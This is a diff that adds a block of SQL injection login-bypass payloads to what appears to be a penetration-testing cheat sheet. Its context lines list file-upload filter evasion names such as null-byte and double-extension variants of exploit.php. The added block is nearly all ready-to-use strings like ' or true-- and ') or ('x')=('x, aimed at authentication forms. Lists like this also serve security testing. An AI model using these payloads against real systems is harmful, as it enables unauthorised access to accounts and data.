@@ -41,3 +41,57 @@ Trailing: exploit.php.
 URL encoding: exploit%2Ephp
 semicolon: exploit.asp;.jpg or exploit.asp%00.jp
 recursiv: exploit.p.phphp
+
+
+# SQL login
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+
+')) or true--
+')) or ((''))=(('
+')) or 1--
+')) or (('x'))=(('
+
+')) or true--
+')) or ((''))=(('
+')) or 1--
+')) or (('x'))=(('
+
+" or true--
+" or ""="
+" or 1--
+" or "x"="
+
+') or true--
+') or ('')=('
+') or 1--
+') or ('x')=('
